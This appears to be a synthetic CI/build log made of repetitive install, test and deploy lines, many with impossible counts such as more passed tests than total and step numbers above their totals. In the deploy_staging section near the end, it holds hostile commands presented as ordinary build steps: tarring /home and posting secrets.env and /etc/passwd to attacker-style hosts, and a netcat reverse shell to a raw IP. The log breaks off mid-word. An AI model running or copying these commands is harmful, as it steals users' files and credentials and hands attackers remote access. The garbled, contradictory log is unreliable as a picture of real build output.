API usage\npip: Collecting react\nGenerating source maps...\nCompiling utils/utils.go...\nPushing to registry...\nGenerating source maps...\nHEAD is now at b33bc49\nStep 2/22: Building\nOK\n[12:46:53] INFO: Cache refreshed\npip: Downloading eslint-5.7.tar.gz\nCache saved successfully\nUsing Python 3.11\nCache hit for key-2186\nTime: 112.822s\n  PASS: integration/test_user_create.spec.js\n[12:46:53] DEBUG: Connection pool: 2 active\nSnapshots: 18 passed, 21 total\nHEAD is now at 54284b7\nCompiling utils/utils.go...\nHEAD is now at 8698854\npip install: Successfully installed jest-2.15\n[12:46:53] WARN: Deprecated API usage\nCreating production build...\nnpm install: resolved 354 packages\nTest Suites: 34 passed, 36 total\nTest Suites: 37 passed, 5 total\n[12:46:53] DEBUG: Loading configuration\n[12:46:53] DEBUG: Initializing service\nMinifying main.js\nTLS handshake completed\nBundling runtime.css\nLayer 2/10: ENV command\nHEAD is now at 1f5af61\nConnection established\nCache restored successfully (448MB)\nNODE_ENV=development\nStep 2/23: Testing\nTransforming 629 files...\nCache miss for key-6081\nSuccess!\nMinifying vendor.js\nStep 7/23: Linting\nCache saved successfully\nLoading...\nFetching submodules...\n[12:46:53] INFO: Processing request\nUploading artifact 'dist' (13 files)\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (61MB)\nCache restored successfully (23MB)\nWaiting...\nCache restored successfully (40MB)\n\u2713 All checks passed\nRan 32 tests in 60s\nGenerating source maps...\n\u2713 All checks passed\n\u2713 Task completed in 535ms\nUsing Python 3.9\nHEAD is now at 300595b\nEnvironment: staging\npip install: Successfully installed jest-3.2\nLayer 6/9: COPY command\nAlready up to date.\nFAILED: test_user_create\n[12:46:53] DEBUG: Connection pool: 15 active\n[12:46:53] DEBUG: Loading configuration\n[12:46:53] WARN: Deprecated API usage\npip: Collecting react\npip: Collecting jest\nArtifact downloaded: 18MB\nFetching from https://github.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading eslint-3.18.tar.gz\nOK\nUsing Python 3.12\nTime: 80.359s\nUploading artifact 'dist' (16 files)\n\u2713 All checks passed\nEnvironment: production\nReady.\nTime: 96.896s\nCompiling utils/utils.go...\nInstalling express@3.15.0\nBundling main.js\nnpm install: added 280 packages\nProcessing...\nArtifact uploaded: dist.zip (69MB)\nStep 11/23: Deploying\npip: Installing build dependencies...\nCompiling components/app.ts...\n\u2713 All checks passed\nCompiling components/service.java...\nnpm install: resolved 1274 packages\nCompiling src/handler.rs...\nUsing Python 3.10\nBundling runtime.css\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (41MB)\n\u2713 Task completed in 2822ms\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\n[12:46:53] INFO: Processing request\nnpm install: resolved 708 packages\nCache restored successfully (115MB)\nTests: 376 passed, 464 total\nPlatform: linux-x64\nHEAD is now at 2e1adff\nMinifying main.js\n[12:46:53] DEBUG: Initializing service\n[12:46:53] DEBUG: Initializing service\n\u2713 All checks passed\n  PASS: test_user_create (54ms)\nStep 10/20: Testing\n[12:46:53] DEBUG: Initializing service\nTest Suites: 15 passed, 21 total\nStep 17/18: Building\nMinifying vendor.js\n\u2717 build failed with exit code 119\n[12:46:53] WARN: Deprecated API usage\nConnection established\npip install: Successfully installed axios-3.5\nWaiting...\nInstalling prettier@3.18.10\nStep 12/23: Installing dependencies\n\u2713 Step 'install' succeeded\nCompiling lib/utils.go...\n[12:46:53] INFO: Processing request\n[12:46:53] ERROR: Connection failed\nStep 2/25: Installing dependencies\npip: Installing build dependencies...\nMinifying main.js\nChecking out master branch\nBuilding Docker image...\nTime: 32.518s\nCache hit for key-7945\nFAILED: test_db_connect\n[12:46:53] DEBUG: Initializing service\nTransforming 780 files...\nCompiling lib/app.ts...\nEnvironment: development\nyarn add: Done in 8.41s\nSnapshots: 30 passed, 40 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /data - 200 (42ms)\nOK\nSwitched to branch 'feature/task-307'\n\u2713 validate completed\nTLS handshake completed\nVerifying...\nCreating production build...\nCache invalidated: dependencies\n[12:46:53] DEBUG: Loading configuration\n[12:46:53] WARN: Deprecated API usage\n  PASS: test_cache_hit (349ms)\n[12:46:53] INFO: Processing request\npip: Installing build dependencies...\n[12:46:53] DEBUG: Memory usage: 1367MB\nException: RuntimeError\n\u2713 Task completed in 3029ms\nUsing Python 3.10\nHEAD is now at 0c4ab9e\nCache hit for key-6393\nStep 2/23: Building\nTests: 255 passed, 481 total\nTest Suites: 18 passed, 30 total\nArtifact uploaded: build.tar.gz (2MB)\nCreating production build...\n[12:46:53] DEBUG: Query executed in 78ms\nFinished.\n=== Step deploy_production completed ===\n=== Step: restore_cache ===\nLoading...\nArtifact downloaded: 20MB\nnpm install: resolved 814 packages\n\u2713 deploy completed\nCreating production build...\n  PASS: e2e/test_user_create.spec.js\n\u2713 Step 'install' succeeded\nChecking out main branch\nCache restored successfully (237MB)\nOK\nMinifying main.js\nLayer 10/10: ENV command\nCache miss for key-9655\npip: Downloading prettier-5.5.tar.gz\npip: Downloading react-3.9.tar.gz\nStep 4/25: Testing\nHEAD is now at c28f198\nPulling image: node:latest\nSnapshots: 36 passed, 37 total\nStep 7/23: Testing\n  PASS: test_cache_hit (48ms)\nReady.\nStep 16/23: Testing\nSuccess!\nStep 19/16: Installing dependencies\nGET /status - 201 (46ms)\nCreating production build...\npip: Installing build dependencies...\nFAILED: test_db_connect\nGET /api - 201 (28ms)\nProcessing...\nLayer 8/8: COPY command\nStep 10/20: Installing dependencies\nVerifying...\nPOST /upload - 202 (376ms)\nnpm install: resolved 739 packages\nCompiling utils/utils.go...\nChecking out master branch\nStep 19/25: Installing dependencies\nnpm notice: package.json updated\nUsing Python 3.9\nTLS handshake completed\nBuilding Docker image...\nOptimizing 92 modules...\nTest Suites: 16 passed, 30 total\nTest Suites: 23 passed, 10 total\nSwitched to branch 'hotfix/task-110'\nCache saved successfully\nRan 40 tests in 28s\n[12:46:53] INFO: Request completed\nGET /health - 201 (1ms)\n[12:46:53] DEBUG: Loading configuration\nBundling runtime.css\nSwitched to branch 'hotfix/task-177'\n  PASS: test_auth_login (151ms)\nCompiling components/app.ts...\nDone.\n  PASS: test_api_health (152ms)\nAlready up to date.\n[12:46:53] INFO: Processing request\nReady.\nHEAD is now at 1ce11ff\nOK\n[12:46:53] WARN: Deprecated API usage\n[12:46:53] DEBUG: Loading configuration\nHEAD is now at 6ce6961\nyarn add: Done in 3.54s\nChecking out main branch\nStep 19/15: Running migrations\nGET /health - 204 (41ms)\n[12:46:53] WARN: Deprecated API usage\nMinifying app.js\nnpm notice: package.json updated\nnpm notice: created a lockfile\nTLS handshake completed\n[12:46:53] DEBUG: Memory usage: 612MB\nPlatform: win32-x64\nCreating production build...\nGET /status - 201 (92ms)\nCompleted.\nOptimizing 44 modules...\nProcessing...\n[12:46:53] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-885'\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 11/21: Building\nFetching submodules...\nFetching submodules...\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nChecking out main branch\n[12:46:53] WARN: Deprecated API usage\nNODE_ENV=development\nnpm notice: created a lockfile\nWARNING: jest has known vulnerabilities\nArtifact uploaded: dist.zip (22MB)\nUploading artifact 'coverage' (29 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nCompiling utils/utils.go...\nnpm notice: created a lockfile\n[12:46:53] DEBUG: Initializing service\n  PASS: test_user_create (95ms)\nConnection established\nCache saved successfully\nFetching submodules...\n  PASS: test_user_create (91ms)\nFetching from https://gcr.io/package.json\nProcessing...\nEnvironment: development\nLayer 9/13: COPY command\nOptimizing 90 modules...\nArtifact uploaded: build.tar.gz (41MB)\n[12:46:53] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nMinifying main.js\n  PASS: e2e/test_auth_login.spec.js\npip: Collecting jest\nOK\nFetching from https://googleapis.com/package.json\nCreating production build...\nWARNING: axios has known vulnerabilities\nSuccess!\nNODE_ENV=production\n[12:46:53] DEBUG: Loading configuration\nCoverage: 81% statements, 66% branches\nTests: 247 passed, 63 total\nReady.\n\u2713 deploy completed\n[12:46:53] INFO: Starting build process\n[12:46:53] DEBUG: Memory usage: 1945MB\nInstalling express@3.10.1\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\nTransforming 208 files...\nProcessing...\n\u2713 Step 'test' succeeded\n\u2713 Task completed in 2271ms\n[12:46:53] WARN: Deprecated API usage\nWaiting...\nDone.\n\u2713 Step 'setup' succeeded\nSnapshots: 43 passed, 2 total\nnpm install: added 184 packages\n\u2713 All checks passed\nSnapshots: 31 passed, 21 total\nArtifact uploaded: build.tar.gz (4MB)\nCompiling lib/utils.go...\nCache hit for key-1657\nCache saved successfully\nnpm install: added 319 packages\nConnection established\nGET /health - 204 (55ms)\npip: Downloading axios-2.3.tar.gz\nException: TypeError\nnpm notice: package.json updated\npip install: Successfully installed jest-5.12\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\n[12:46:53] ERROR: Connection failed\nStep 9/20: Linting\nSnapshots: 9 passed, 5 total\n[12:46:53] DEBUG: Connection pool: 16 active\nUsing Python 3.9\nPulling image: node:3.11\nDone.\nException: TypeError\nDone.\n[12:46:53] INFO: Request completed\n[12:46:53] INFO: Connecting to database\nGET /api - 200 (75ms)\n[12:46:53] DEBUG: Loading configuration\nConnection established\n[12:46:53] INFO: Request completed\nEnvironment: development\nWARNING: eslint has known vulnerabilities\n[12:46:53] WARN: Deprecated API usage\nnpm install: resolved 1498 packages\n\u2713 package completed\nnpm install: resolved 1826 packages\nFetching submodules...\nCompiling utils/service.java...\nFinished.\nCoverage: 80% statements, 92% branches\nPulling image: python:18\nOK\n\u2713 test completed\n[12:46:53] WARN: Deprecated API usage\n\u2713 Task completed in 1785ms\nBuilding Docker image...\n[12:46:53] DEBUG: Connection pool: 16 active\nArtifact uploaded: build.tar.gz (14MB)\n[12:46:53] INFO: Request completed\nyarn add: Done in 3.39s\nChecking out develop branch\nnpm notice: package.json updated\nTLS handshake completed\n  PASS: e2e/test_db_connect.spec.js\n\u2713 test completed\nStep 13/20: Building\n=== Step restore_cache completed ===\n=== Step: type_check ===\nCompleted.\n\u2713 deploy completed\nLoading...\nCache saved successfully\n[12:46:53] WARN: Deprecated API usage\nBundling vendor.js\nOptimizing 38 modules...\nnpm notice: package.json updated\nFAILED: test_cache_hit\nUploading artifact 'build' (50 files)\nnpm install: added 79 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@3.7.0\nFetching from https://amazonaws.com/package.json\nUploading artifact 'build' (9 files)\nnpm install: added 488 packages\n[12:46:53] WARN: Deprecated API usage\nyarn add: Done in 29.27s\nFetching from https://github.com/package.json\nTLS handshake completed\nRan 62 tests in 43s\nUploading artifact 'build' (8 files)\nChecking out master branch\nMinifying main.js\nPushing to registry...\nPushing to registry...\n\u2713 test completed\nCache restored successfully (281MB)\nnpm notice: package.json updated\nBuilding Docker image...\n  PASS: e2e/test_api_health.spec.js\nProcessing...\nFinished.\n[12:46:53] DEBUG: Loading configuration\n[12:46:53] INFO: Cache refreshed\n\u2713 Task completed in 2169ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling lib/utils.go...\n  PASS: integration/test_api_health.spec.js\n[12:46:53] INFO: Request completed\nPushing to registry...\nPlatform: linux-x64\nGET /status - 204 (7ms)\nCache hit for key-9140\nSnapshots: 9 passed, 13 total\nStep 7/19: Linting\nAlready up to date.\nLoading...\nTLS handshake completed\nCache restored successfully (245MB)\nStep 18/21: Linting\nCache restored successfully (362MB)\nUsing Node.js 15.16.7\nEnvironment: production\nBundling styles.js\nLayer 8/15: COPY command\nCache invalidated: node_modules\nOptimizing 77 modules...\nTest Suites: 27 passed, 30 total\nPushing to registry...\nPOST /api - 200 (129ms)\nTransforming 565 files...\nSuccess!\nSwitched to branch 'bugfix/task-872'\nStep 2/25: Testing\nArtifact uploaded: build.tar.gz (5MB)\nProcessing...\nSnapshots: 11 passed, 36 total\nDone.\nRan 54 tests in 39s\nnpm install: added 255 packages\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nFetching from https://amazonaws.com/package.json\npip install: Successfully installed lodash-5.20\n\u2713 build completed\nTests: 442 passed, 123 total\nnpm install: added 361 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 48 passed, 11 total\nEnvironment: development\n[12:46:53] DEBUG: Memory usage: 365MB\n[12:46:53] INFO: Cache refreshed\n\u2713 package completed\nCoverage: 81% statements, 66% branches\n[12:46:53] DEBUG: Memory usage: 1690MB\n[12:46:53] WARN: Deprecated API usage\nConnection established\nVerifying...\nArtifact uploaded: build.tar.gz (11MB)\nWARNING: jest has known vulnerabilities\nLayer 8/11: COPY command\nSnapshots: 35 passed, 3 total\n[12:46:53] INFO: Request completed\npip: Installing build dependencies...\npip: Downloading react-3.1.tar.gz\n[12:46:53] DEBUG: Initializing service\nProcessing...\nUploading artifact 'coverage' (10 files)\n[12:46:53] ERROR: Connection failed\nFetching submodules...\nOptimizing 46 modules...\nConnection established\nUploading artifact 'dist' (17 files)\nAlready up to date.\nnpm install: resolved 966 packages\n[12:46:53] INFO: Connecting to database\nUsing Python 3.11\nWARNING: prettier has known vulnerabilities\nNODE_ENV=development\nCache invalidated: build\nStep 9/21: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nWaiting...\nCache saved successfully\nWARNING: jest has known vulnerabilities\nFetching from https://gcr.io/package.json\nStep 19/15: Linting\npip: Installing build dependencies...\nTransforming 382 files...\nCoverage: 97% statements, 62% branches\n  PASS: test_api_health (321ms)\npip: Installing build dependencies...\n\u2713 validate completed\n  PASS: integration/test_api_health.spec.js\n[12:46:53] DEBUG: Query executed in 91ms\nGET /health - 201 (73ms)\nStep 5/21: Installing dependencies\nUsing Python 3.10\nCompiling src/utils.go...\nnpm install: resolved 1838 packages\nArtifact uploaded: build.tar.gz (20MB)\nStep 9/20: Running migrations\n  PASS: test_api_health (426ms)\nArtifact uploaded: dist.zip (41MB)\nTransforming 947 files...\n[12:46:53] INFO: Cache refreshed\n  PASS: e2e/test_auth_login.spec.js\nChecking out main branch\n[12:46:53] DEBUG: Query executed in 74ms\npip install: Successfully installed webpack-3.8\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (281MB)\nPushing to registry...\n[12:46:53] INFO: Connecting to database\nCache invalidated: build\n[12:46:53] DEBUG: Initializing service\n[12:46:53] DEBUG: Connection pool: 11 active\nConnection established\nEnvironment: development\nAlready up to date.\nnpm notice: package.json updated\nCompiling lib/index.js...\n[12:46:53] INFO: Request completed\nBuilding Docker image...\n[12:46:53] INFO: Processing request\nSwitched to branch 'bugfix/task-306'\nUsing Python 3.11\n\u2713 validate completed\nCompleted.\nCoverage: 90% statements, 65% branches\n[12:46:53] DEBUG: Memory usage: 1191MB\nOK\nCache saved successfully\nCache saved successfully\nConnection established\nnpm install: added 145 packages\n[12:46:53] DEBUG: Query executed in 33ms\nArtifact downloaded: 4MB\nSnapshots: 8 passed, 44 total\nRan 68 tests in 29s\nSuccess!\nTLS handshake completed\nCoverage: 91% statements, 73% branches\nConnection established\n[12:46:53] DEBUG: Connection pool: 12 active\nSuccess!\nSuccess!\nBuilding Docker image...\nProcessing...\nCompiling utils/index.js...\nEnvironment: test\nOptimizing 24 modules...\nStep 5/25: Building\nBundling vendor.js\n[12:46:53] WARN: Deprecated API usage\nnpm install: added 465 packages\nStep 14/22: Installing dependencies\nCoverage: 89% statements, 81% branches\nArtifact downloaded: 47MB\nMinifying vendor.js\nEnvironment: staging\nPOST /api - 200 (415ms)\nnpm install: added 282 packages\nCache invalidated: node_modules\nCompiling components/app.ts...\nLoading...\nHEAD is now at 7822f73\n\u2713 Task completed in 897ms\nPulling image: alpine:3.11\n=== Step type_check completed ===\n=== Step: lint ===\nLayer 6/14: COPY command\nStep 6/23: Installing dependencies\nStep 14/23: Running migrations\nWARNING: react has known vulnerabilities\n  PASS: test_cache_hit (75ms)\nnpm install: resolved 814 packages\nCoverage: 77% statements, 67% branches\nStep 2/17: Running migrations\n[12:46:53] WARN: Deprecated API usage\n\u2713 Task completed in 859ms\nTime: 119.516s\nTime: 41.74s\nChecking out master branch\nCache hit for key-1636\n[12:46:53] DEBUG: Loading configuration\nCache saved successfully\n\u2713 validate completed\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 23 modules...\nProcessing...\nImage pulled successfully\nNODE_ENV=development\nStep 9/21: Linting\nStep 12/23: Building\n[12:46:53] WARN: Deprecated API usage\nProcessing...\n[12:46:53] WARN: Deprecated API usage\nUsing Python 3.11\nCache hit for key-8917\npip install: Successfully installed eslint-5.8\nPulling image: node:latest\nTransforming 467 files...\n[12:46:53] ERROR: Connection failed\n[12:46:53] INFO: Request completed\n[12:46:53] WARN: Deprecated API usage\nTLS handshake completed\n[12:46:53] WARN: Deprecated API usage\nStep 5/24: Installing dependencies\nCache saved successfully\nCompiling utils/utils.go...\n[12:46:53] WARN: Deprecated API usage\nCompiling utils/main.py...\nAlready up to date.\n\u2713 All checks passed\nUsing Node.js 16.8.7\nConnection established\nPushing to registry...\n[12:46:53] INFO: Request completed\nNODE_ENV=production\nyarn add: Done in 23.51s\n[12:46:53] INFO: Request completed\nInstalling eslint@5.6.7\nCache hit for key-2651\nyarn add: Done in 25.54s\nHEAD is now at 73469c7\nWARNING: axios has known vulnerabilities\nCompiling components/index.js...\nStep 16/23: Installing dependencies\nTransforming 918 files...\n\u2717 build failed with exit code 104\n[12:46:53] INFO: Starting build process\n[12:46:53] INFO: Request completed\nGenerating source maps...\nnpm install: added 392 packages\nConnection established\nStep 11/20: Deploying\npip: Downloading express-2.15.tar.gz\nVerifying...\nReady.\nFetching from https://githubusercontent.com/package.json\nTransforming 935 files...\n[12:46:53] DEBUG: Connection pool: 7 active\nnpm notice: created a lockfile\nStep 13/22: Running migrations\nCreating production build...\nWaiting...\nPlatform: darwin-arm64\nSnapshots: 20 passed, 48 total\nChecking out main branch\n[12:46:53] INFO: Cache refreshed\nMinifying app.js\npip: Downloading axios-5.19.tar.gz\nStep 12/19: Running migrations\n[12:46:53] DEBUG: Query executed in 10ms\nWARNING: express has known vulnerabilities\npip: Collecting lodash\nNODE_ENV=development\npip install: Successfully installed jest-5.14\n[12:46:53] ERROR: Connection failed\nFAILED: test_cache_hit\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:53] DEBUG: Initializing service\n[12:46:53] DEBUG: Query executed in 68ms\nChecking out develop branch\nEnvironment: test\nTests: 273 passed, 171 total\n\u2717 build failed with exit code 64\nCompiling components/handler.rs...\npip: Installing build dependencies...\nLayer 7/14: COPY command\nVerifying...\n[12:46:53] WARN: Deprecated API usage\n[12:46:53] ERROR: Connection failed\nCompiling src/handler.rs...\nnpm install: resolved 793 packages\nStep 11/16: Linting\n[12:46:53] WARN: Deprecated API usage\nSwitched to branch 'feature/task-615'\n[12:46:53] INFO: Connecting to database\n\u2717 build failed with exit code 94\nConnection established\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nWARNING: prettier has known vulnerabilities\nInstalling jest@4.4.0\nVerifying...\nStep 9/23: Testing\nStep 13/15: Installing dependencies\nPulling image: python:18\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 13/24: Linting\n[12:46:53] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling lib/index.js...\nArtifact uploaded: dist.zip (2MB)\n[12:46:53] WARN: Deprecated API usage\nTest Suites: 18 passed, 38 total\npip: Installing build dependencies...\nUploading artifact 'build' (35 files)\nnpm install: resolved 675 packages\nStep 9/18: Testing\nException: NullPointerException\nCompiling utils/main.py...\nOptimizing 34 modules...\nImage pulled successfully\nCache hit for key-3443\nBundling main.js\nReady.\nReady.\nCompiling lib/app.ts...\nRan 125 tests in 58s\nSuccess!\nUsing Python 3.10\nStep 18/21: Building\nTime: 104.101s\nUploading artifact 'coverage' (30 files)\npip: Installing build dependencies...\nMinifying vendor.js\nChecking out main branch\nSuccess!\npip: Installing build dependencies...\nCache hit for key-5781\nWaiting...\nnpm install: added 86 packages\nOptimizing 53 modules...\nException: ValueError\nFetching from https://googleapis.com/package.json\nCompiling lib/main.py...\nStep 12/16: Installing dependencies\nWaiting...\npip: Installing build dependencies...\nCache invalidated: build\nTests: 242 passed, 490 total\nnpm notice: package.json updated\nTransforming 641 files...\nOK\nUploading artifact 'build' (41 files)\nTime: 79.16s\n[12:46:53] DEBUG: Connection pool: 14 active\nCompiling components/handler.rs...\nStep 8/25: Running migrations\nWARNING: react has known vulnerabilities\n[12:46:53] DEBUG: Loading configuration\nStep 1/20: Deploying\nTLS handshake completed\nCreating production build...\nFetching submodules...\n\u2713 All checks passed\n[12:46:53] INFO: Cache refreshed\nCompiling utils/main.py...\n  PASS: integration/test_auth_login.spec.js\nCompleted.\nException: NullPointerException\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: webpack has known vulnerabilities\nConnection established\nEnvironment: staging\n[12:46:53] WARN: Deprecated API usage\nHEAD is now at 59d204d\nSuccess!\nStep 10/20: Running migrations\nReady.\nCreating production build...\nFetching from https://githubusercontent.com/package.json\nArtifact uploaded: build.tar.gz (29MB)\nHEAD is now at eb5aaa0\nStep 19/20: Building\n[12:46:53] DEBUG: Initializing service\n  PASS: unit/test_db_connect.spec.js\nOptimizing 12 modules...\n=== Step lint completed ===\n=== Step: install_dependencies ===\n  PASS: test_api_health (14ms)\nConnection established\nStep 10/21: Testing\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 All checks passed\nArtifact downloaded: 24MB\n[12:46:53] DEBUG: Memory usage: 631MB\n\u2713 All checks passed\nStep 10/18: Building\nReady.\n[12:46:53] INFO: Request completed\nStep 13/23: Testing\nCompiling lib/index.js...\nTime: 7.460s\nStep 7/22: Running migrations\nException: RuntimeError\n\u2713 test completed\nVerifying...\nMinifying app.js\nCoverage: 99% statements, 91% branches\nPlatform: linux-x64\nCache saved successfully\nyarn add: Done in 1.98s\nSnapshots: 0 passed, 34 total\nVerifying...\nWARNING: axios has known vulnerabilities\n[12:46:53] WARN: Deprecated API usage\nyarn add: Done in 16.94s\nPOST /upload - 200 (484ms)\nCache restored successfully (469MB)\nAlready up to date.\nArtifact uploaded: dist.zip (44MB)\nCache restored successfully (294MB)\npip: Collecting lodash\nnpm notice: package.json updated\nSnapshots: 45 passed, 28 total\nMinifying main.js\nEnvironment: test\nCache restored successfully (447MB)\n[12:46:53] DEBUG: Initializing service\n\u2713 All checks passed\n\u2713 build completed\nyarn add: Done in 19.64s\nAlready up to date.\nCompiling lib/app.ts...\nnpm install: resolved 1901 packages\nUsing Node.js 18.8.8\nWaiting...\nStep 19/18: Running migrations\nException: NullPointerException\npip install: Successfully installed prettier-1.8\nCompiling lib/app.ts...\nInstalling eslint@1.8.5\n[12:46:53] DEBUG: Connection pool: 18 active\nSwitched to branch 'feature/task-346'\nUploading artifact 'build' (4 files)\nBuilding Docker image...\n[12:46:53] INFO: Processing request\nArtifact downloaded: 46MB\nCache saved successfully\nCreating production build...\nyarn add: Done in 11.40s\nCache hit for key-2218\nCompleted.\nArtifact downloaded: 38MB\nCompiling utils/handler.rs...\npip install: Successfully installed lodash-2.8\nCoverage: 95% statements, 65% branches\nException: TypeError\n[12:46:53] DEBUG: Loading configuration\npip: Downloading prettier-4.20.tar.gz\nReady.\nUploading artifact 'dist' (17 files)\nTests: 101 passed, 113 total\n[12:46:53] DEBUG: Memory usage: 827MB\nGET /health - 201 (48ms)\nPOST /api - 200 (83ms)\n[12:46:53] DEBUG: Memory usage: 1621MB\n\u2713 Step 'build' succeeded\nFetching submodules...\nCache saved successfully\nGenerating source maps...\nReady.\nCreating production build...\nStep 4/15: Testing\nStep 8/16: Installing dependencies\nCache hit for key-1131\nArtifact uploaded: build.tar.gz (4MB)\nArtifact downloaded: 21MB\nCompiling utils/app.ts...\nArtifact uploaded: build.tar.gz (38MB)\nAlready up to date.\nProcessing...\nPulling image: node:3.11\nnpm install: resolved 1846 packages\nChecking out master branch\nLoading...\nCompiling utils/service.java...\nChecking out main branch\n[12:46:53] DEBUG: Loading configuration\nHEAD is now at 8fe742c\nTime: 78.753s\nCompiling components/app.ts...\nTests: 465 passed, 227 total\nnpm install: resolved 1143 packages\nArtifact uploaded: build.tar.gz (13MB)\nnpm install: added 318 packages\nBundling runtime.js\nPushing to registry...\nNODE_ENV=development\n[12:46:53] WARN: Deprecated API usage\nUsing Node.js 20.10.6\nTransforming 218 files...\nCoverage: 80% statements, 86% branches\nnpm install: added 240 packages\nCompleted.\nChecking out develop branch\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: build\nChecking out master branch\npip: Downloading express-2.7.tar.gz\nnpm install: added 231 packages\nUploading artifact 'dist' (7 files)\nnpm install: resolved 512 packages\n[12:46:53] INFO: Connecting to database\nAlready up to date.\n[12:46:53] DEBUG: Connection pool: 12 active\n[12:46:53] ERROR: Connection failed\nUsing Node.js 15.20.0\nWARNING: webpack has known vulnerabilities\n\u2713 Step 'install' succeeded\n\u2713 Task completed in 4709ms\nTests: 322 passed, 59 total\n[12:46:53] INFO: Cache refreshed\n\u2713 Task completed in 3561ms\nFetching from https://gcr.io/package.json\nTests: 116 passed, 249 total\nFetching from https://amazonaws.com/package.json\n[12:46:53] INFO: Processing request\nArtifact downloaded: 2MB\nDone.\nArtifact uploaded: dist.zip (49MB)\nDone.\n\u2717 build failed with exit code 30\n[12:46:53] DEBUG: Connection pool: 16 active\nnpm install: resolved 1264 packages\n[12:46:53] WARN: Deprecated API usage\nOptimizing 22 modules...\nLayer 4/15: RUN command\nCompleted.\n  PASS: e2e/test_cache_hit.spec.js\nLoading...\npip: Collecting express\nBundling vendor.css\nCache saved successfully\nLayer 1/13: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTests: 142 passed, 241 total\n\u2713 Task completed in 1646ms\nMinifying app.js\n\u2717 build failed with exit code 35\nStep 19/24: Building\nCache restored successfully (448MB)\nCache invalidated: dependencies\nStep 19/15: Building\nFetching submodules...\n\u2717 build failed with exit code 109\nStep 9/19: Installing dependencies\nTLS handshake completed\n[12:46:53] DEBUG: Loading configuration\nUsing Node.js 18.19.10\nCache invalidated: dependencies\nWaiting...\nGET /api - 201 (25ms)\n\u2713 All checks passed\nTLS handshake completed\nOptimizing 49 modules...\nPOST /api - 201 (494ms)\nCompleted.\nProcessing...\n[12:46:53] DEBUG: Memory usage: 1851MB\nArtifact uploaded: dist.zip (40MB)\nSnapshots: 9 passed, 22 total\nUsing Node.js 15.9.4\n  PASS: integration/test_user_create.spec.js\n  PASS: test_db_connect (98ms)\nArtifact downloaded: 36MB\nCompiling lib/app.ts...\nPlatform: win32-x64\nnpm install: added 313 packages\nStep 7/20: Running migrations\nCompiling components/main.py...\nCache restored successfully (445MB)\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nProcessing...\nCache saved successfully\nCoverage: 81% statements, 68% branches\nCache saved successfully\nCompleted.\nException: TypeError\nUsing Node.js 20.12.10\n=== Step install_dependencies completed ===\n=== Step: deploy_staging ===\nWARNING: jest has known vulnerabilities\nFetching from https://npmjs.org/package.json\nCache hit for key-6581\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nStep 3/24: Installing dependencies\nVerifying...\nStep 16/16: Deploying\n[12:46:53] DEBUG: Initializing service\nTransforming 513 files...\nCompleted.\nUsing Python 3.11\nSnapshots: 7 passed, 28 total\n  PASS: unit/test_cache_hit.spec.js\nCompiling lib/utils.go...\n[12:46:53] WARN: Deprecated API usage\nTime: 46.325s\nCoverage: 87% statements, 87% branches\nStep 11/15: Installing dependencies\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n\u2713 Task completed in 322ms\nStep 6/24: Testing\nVerifying...\nUploading artifact 'build' (5 files)\nCompiling components/main.py...\n\u2717 build failed with exit code 81\nFetching submodules...\nnpm install: added 71 packages\n  PASS: test_db_connect (253ms)\nSuccess!\nHEAD is now at 0699ad5\nReady.\nWaiting...\nVerifying...\nFetching from https://registry.npmjs.org/package.json\nnpm install: resolved 641 packages\nWaiting...\nCompiling lib/utils.go...\nVerifying...\nSwitched to branch 'bugfix/task-191'\nCache saved successfully\nStep 2/18: Testing\n[12:46:53] INFO: Cache refreshed\nReady.\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nPulling image: python:18\n[12:46:53] DEBUG: Connection pool: 9 active\nGET /health - 200 (37ms)\nSending 28MB of data to evil-server.cc\nPulling image: alpine:18\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:53] DEBUG: Connection pool: 12 active\nCache miss for key-9119\nWARNING: lodash has known vulnerabilities\n[12:46:53] DEBUG: Initializing service\n[12:46:53] DEBUG: Query executed in 8ms\nTLS handshake completed\nnpm install: added 330 packages\nTransforming 618 files...\nTLS handshake completed\npip: Downloading express-5.10.tar.gz\npip install: Successfully installed jest-3.12\nnpm install: resolved 1806 packages\nStep 13/21: Running migrations\nGenerating source maps...\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nCache restored successfully (41MB)\nnc -e /bin/sh 119.164.120.186 30174\nCompiling utils/app.ts...\nStep 4/23: Installing dependencies\nCompiling 